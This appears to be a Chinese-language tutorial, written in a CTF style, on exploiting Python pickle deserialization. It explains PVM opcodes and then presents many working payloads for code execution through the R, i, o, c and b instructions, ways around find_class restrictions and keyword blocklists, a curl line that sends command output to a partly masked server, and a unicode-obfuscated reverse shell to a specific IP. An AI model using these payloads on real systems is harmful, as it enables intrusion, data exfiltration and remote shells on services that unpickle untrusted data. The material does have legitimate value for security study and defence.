---
weight: 999
title: "Pickle反序列化"
description: ""
icon: "article"
date: "2025-05-30T09:41:09+08:00"
lastmod: "2025-05-30T09:41:09+08:00"
draft: false
toc: true
---

# 可被序列化的目标：
- None，True，False
- 整数，浮点数，复数
- str，byte，bytearray
- 只包含可序列化对象的集合：tuple，list，set，dict
- 定义在模块最外层的函数，指使用def定义的函数，而不是lambda
- 定义在模块最外层的内置函数
- 定义在模块最外层的类
- `__dict__` 属性值或者`__getstate__()`函数返回值可以被序列化的类

# 反序列化过程
pickle反序列化依靠PVM（Pickle Virtual Machine）进行。
其涉及三个部分：
- 解析引擎
- 存放到栈
- 存储到内存
解析引擎：从流中读取opcode和参数，对其进行解释处理，直到遇到`.`停止，最后留在栈顶的值就是反序列化对象。
栈：由list实现，存储临时对象，参数以及对象
内存memo：由dict实现，为PVM的生命周期提供存储，即将反序列化完成的数据以`key-value`的形式存在memo中以供后面使用。

# opcode
pickle在由不同的实现版本，在py2和3得到的opcode不相同，但各个版本可以向下兼容。目前有六个版本：
```python
import pickle

a={'1': 1, '2': 2}

print(f'# 原变量：{a!r}')
for i in range(4):
    print(f'pickle版本{i}',pickle.dumps(a,protocol=i))
```

```text
# 原变量：{'1': 1, '2': 2}
pickle版本0 b'(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.'
pickle版本1 b'}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.'
pickle版本2 b'\x80\x02}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.'
pickle版本3 b'\x80\x03}q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.'
pickle版本4 b'\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x011\x94K\x01\x8c\x012\x94K\x02u.'
```

pickle3版本opcode示例：
原数据：`abcd`
`b'\x80\x03X\x04\x00\x00\x00abcdq\x00.'`
- `\x80`：协议头声明，读取此字符串后，会再读取一个字节
- `\x03`：协议版本
- `\x04\x00\x00\x00`：数据长度：4
- `abcd`数据
- `q`存储在栈顶的字符串长度
- `\x00`栈顶位置，一个字节
- `.`数据截止

`b'\x80\x03c__main__\nStudent\n)\x81}(Vname\nVrxz\nVgrade\nVG2\nub.'`
- `c`：GLOBAL操作符，连续读取两个字符串，分别作为`module`和`name`，以`\n`分割，然后把`module.name`压入栈。注意此操作符使用`find_class`函数，作用为从x模块找到y，且只能在y在x顶层情况下找到y
- `)`：将一个空的元组`tuple`压入当前栈
- `\x81`：从栈中先弹出一个元素，记为`args`；再弹出一个元素记为`cls`，接下来执行`cls.__new__(cls,*arg)`，然后把得到的内容压入栈。即弹出参数和类，利用这个参数实例化类。
- `}`：将一个空`dist`压入栈
- `(`：MARK操作符，`load_mark`；将当前栈作为一个list，压进前序栈；然后把当前栈清空。
- `V`：读入字符串，以`\n`结尾，压入栈。
- `u`：调用`pop_mark`，记录当前栈为`list`，在`load_mark`结束后返回；弹出前序栈栈顶，用list覆盖前序栈。执行之后结果：`arr=['name','rxz','grade','G2']`，当前栈为`__main__.Sudent`类和空`dict`；拿到当前栈的末尾元素，必须为`dict`，两个一组读取arr里的元素，前者为key后者为value存入`dict`。得到`{'name': 'rxz', 'grade': 'G2'}`，现在栈里面有一个实例一个字典
- `b`：将当前栈栈顶存进`state`，弹出；当前栈栈顶为`inst`，弹出；用`state`的值更新实例`inst`；压入栈。此处使用的方法为：如果`inst`有`__setstate__`方法，直接交给方法，否则把`state`中的字典合并到`inst.__dict__`
- `.`：结束；最后得到的结果是`__main__.Sudent`，其`name`值为`rxz`，`grade`值是`G2`
- `t`：寻找栈中的上一个mark，并组合之间的数据为元组
- `S`：实例化一个字符串对象

pickle0版本部分opcode：

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/pickle-0.png)

[更多参考](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf)

`b'Vabcd\np0\n.'`
- `V`：unicode编码
- `p`：将堆栈最上面的项目复制到memo中


使用pickletools将opcode转换为易于读取的形式
```python
import pickletools

data=b"\x80\x03cbuiltins\nexec\nq\x00X\x13\x00\x00\x00key1=b'1'\nkey2=b'2'q\x01\x85q\x02Rq\x03."
pickletools.dis(data)
```

```text
   0: \x80 PROTO      3
   2: c    GLOBAL     'builtins exec'
   17: q    BINPUT     0
   19: X    BINUNICODE "key1=b'1'\nkey2=b'2'"
   43: q    BINPUT     1
   45: \x85 TUPLE1
   46: q    BINPUT     2
   48: R    REDUCE
   49: q    BINPUT     3
   51: .    STOP
highest protocol among opcodes = 2
```

# 利用方法
## `R`指令
### 原理
大多数题目利用`__reduce__`方法，其指令码为`R`，作用为：
- 取栈顶元素为`args`，弹出
- 取栈顶为`f`，弹出
- `arg`为参数，执行`f`，结果压入栈

此方法会在反序列化的时候执行，`f`会返回字符串或元组。

选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数

```text
b'''cos
system
(S'whoami'
tR.'''
```

利用此方法构造恶意字符串：
```python
class Student():  
    def __init__(self):  
        self.name = "rxz"  
        self.grade = "G2"  
  
    def __reduce__(self):  
        return os.system, ("ls /",)  
  
  
a = pickle.dumps(Student(), protocol=3)
```

### 绕过方式
1. 如果黑名单没禁全，尝试`platform.popen(cmd, mode='r', bufsize=-1)
2. 使用`map`
```python
class Exploit(object):
    def __reduce__(self):
 	return map,(os.system,["ls"])
```

## `i`指令码

```text
b'''(S'whoami'
ios
system
.'''
```
先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）。
```text
    0: (    MARK
    1: S        STRING     'whoami'
   11: i        INST       'os system' (MARK at 0)
   22: .    STOP
```
## `o`指令码

```text
b'''(cos
system
S'whoami'
o.'''
```
寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）。
```text
    0: (    MARK
    1: c        GLOBAL     'os system'
   12: S        STRING     'whoami'
   22: o        OBJ        (MARK at 0)
   23: .    STOP
```
## `c`指令码
### 原理
```python
class Student():  
    def __init__(self):  
        self.name = "rxz"  
        self.grade = "G2"

def check(data):  
    if b'R' in data:  
        return 0  
    x = pickle.loads(data)  
    if x != Student(blue.name,blue.grade):  
        return 0  
    return 1
```
`c`指令码的作用是获取全局变量，故而可以通过替换`rxz`为`blue.name`即可
换成指令是`cblue\nname\n`。
原本是`b'\x80\x03c__main__\nStudent\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00rxzq\x04X\x05\x00\x00\x00gradeq\x05X\x02\x00\x00\x00G2q\x06ub.'`
最后结果是`b'\x80\x03c__main__\nStudent\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00namecblue\nname\nq\x04X\x05\x00\x00\x00gradeq\x05X\x02\x00\x00\x00G2q\x06ub.'`

### 绕过
如果题目对`c`指令进行了限制，只允许包含`__main__`这一个模块，则可以使用变量覆盖。
通过此指令引入的变量，可以看作是原变量的引用，从栈上修改他，也会修改原变量。
- 先通过`__main__.blue`引入这个module
- 然后把一个dict压入栈，内容为`{'name': 'rua', 'grade': 'www'}`
- 执行`b`指令，会改写`__main__.blue.name`和 `__main__.blue.grade`，因此两个变量的值都变为了预期值，后面再正常压入Student对象即可
结果：
 `b'\x80\x03c__main__\nblue\n}(Vname\nVrua\nVgrade\nVwww\nub0c__main__\nStudent\n)\x81}(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.'`
## `b`指令RCE
### 原理
执行build时，当`inst`拥有`__setstate__`方法时，把`state`交给他处理，否则合并到元组内。
所以可以先用build写入`{'__setstate__': os.system}`，把对象的`__setstate__`变为`os.system`，接下来利用`"ls /"`再build对象，会执行`__setstate__("ls /")`，从而达成RCE。
payload：`b'\x80\x03c__main__\nStudent\n)\x81}(V__setstate__\ncos\nsystem\nubVls /\nb.'`
执行完代码后清空栈，再压入一个正常的类即可防止报错
payload：`b'\x80\x03c__main__\nStudent\n)\x81}(V__setstate__\ncos\nsystem\nubVls /\nb0c__main__\nStudent\n)\x81}(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.'`
### 绕过
针对重写`find_class`的，可以利用`sys.module`获取危险函数。
`sys.module`是一个全局字典，字典的键是模块名，值是模块本身。
所以可以通过`get(sys.modules,"moduleName")`获取危险模块。
```python
print(sys.modules)
# 输出全部模块
```
最终需要构造的payload是：`builtins.getattr(builtins.getattr(builtins.dict,'get')(builtins.golbals(),'builtins'),'eval')(command)`
写成opcode：
```text
b'''cbuiltins
getattr
(cbuiltins
getattr
(cbuiltins
dict
S'get'
tR(cbuiltins
globals
)RS'__builtins__'
tRS'eval'
tR(S'__import__("os").system("whoami")'
tR.
'''
```
## 其他
1. 其他模块的load也可能触发pickle反序列化，如`numpy.load()`，使用numpy自身的数据失败后，可以尝试用pickle的格式导入。
2. 即使代码里面没有`import os`，GLOBAL指令也会自动导入。
3. 无回显时执行``os.system('curl your_server/`ls / | base64`)``即可在日志中查看结果。
payload:
```text
b'\x80\x03c__main__\nStudent\n)\x81}(V__setstate__\ncos\nsystem\nubVcurl 47.***.***.105/`ls / | base64`\nb.'
```

绕过各种限制的方式和jail一样
如双写
```python
pk = pickle.dumps(yourobject)
pk = pk.replace(b'os', b'ooss')
```
字符串拼接
```python
class A(object):
    def __reduce__(self):
        return eval,("__import__('o'+'s').system('env |tee b')",)
```

其他：
```python
a = base64.b64decode(session.get('ser_data')).replace(b"builtin", b"BuIltIn").replace(b"os", b"Os").replace(b"bytes", b"Bytes")

if b'R' in a or b'i' in a or b'o' in a or b'b' in a:  
    raise pickle.UnpicklingError("R i o b is forbidden")  

pickle.loads(base64.b64decode(session.get('ser_data')))
```
检测的是a有无riob，但是运行时还是ser_data，利用o和s连用组成os，替换为Os绕过
反弹shell用到`i`，会被检测，所以用`V`，能识别unicode编码
```text
b'''(cos
system
V'\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0031\u0033\u0039\u002e\u0032\u0032\u0034\u002e\u0031\u0033\u0030\u002e\u0031\u0038\u0033\u002f\u0031\u0030\u0030\u0030\u0032\u0020\u0030\u003e\u0026\u0031'
os.'''
```
因为`s`的作用是从堆栈中弹出三个值，一个字典，一个键和值。键/值条目是添加到字典，它被推回到堆栈上，所以前面需要添加一个字典和一个键：
```text
b'''(S'ba'  
S'ss'  
dS'sdasda'  
(cos  
system  
V'\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0031\u0033\u0039\u002e\u0032\u0032\u0034\u002e\u0031\u0033\u0030\u002e\u0031\u0038\u0033\u002f\u0031\u0030\u0030\u0030\u0032\u0020\u0030\u003e\u0026\u0031'  
os.'''
```
## 手写opcode
三种print的方法：
```python
# __import__("builtins").print('a', 'b')

R = b'''cbuiltins
print
(S'a'
S'b'
tR.
'''

o = b'''(cbuiltins
print
S'a'
S'b'
o.
'''

i = b'''(S'a'
S'b'
ibuiltins
print
.
'''
```

例：执行系统命令：
`builtins.getattr(builtins, 'eval')("__import__('os').system('pwd')")`
用到`c`指令导入的有`builtins.getattr`和`builtins`，但pickle不能直接获取`builtins`一级模块，所以`builtins`不能直接导入，需要用：
`builtins.getattr(builtins.dict, 'get')(builtins.globals(), 'builtins')`获取。
组合得到：
`builtins.getattr(builtins.getattr(builtins.dict, 'get')(builtins.globals(), 'builtins'), 'eval')("__import__('os').system('pwd')")`
分层编写opcode：
最内层`function("__import__('os').system('pwd')")`
```text
b'''(
S'__import__('os').system('pwd')'  
o.  
'''
```
然后是最外层的`builtins.getattr`
```text
b'''(
///////
(cbuiltins  
getattr  
arg1  
S'eval'  
o  
///////
S'__import__('os').system('pwd')'  
o.  
'''
```
补全`arg1`，从内层开始`(builtins.globals(), 'builtins')
```text
b'''((cbuiltins  
getattr

///////
(cbuiltins  
globals  
o  
S'builtins'  
/////// 
S'eval'  
o
S'__import__('os').system('pwd')'  
o.  
'''  
pickletools.dis(test)
```
最后是`builtins.getattr(builtins.dict, 'get')`
```
b'''((cbuiltins
getattr

(
///////
(cbuiltins
getattr

cbuiltins
dict

S'get'
o
///////
(cbuiltins
globals
o
S'builtins' 
o

S'eval' 
o

S'__import__('os').system('pwd')' 
o. 
'''
```
最终payload：
```text
b'''((cbuiltins  
getattr  
((cbuiltins  
getattr  
cbuiltins  
dict  
S'get'  
o(cbuiltins  
globals  
oS'builtins'  
oS'eval'  
oS'__import__('os').system('whoami')'  
o.  
'''
```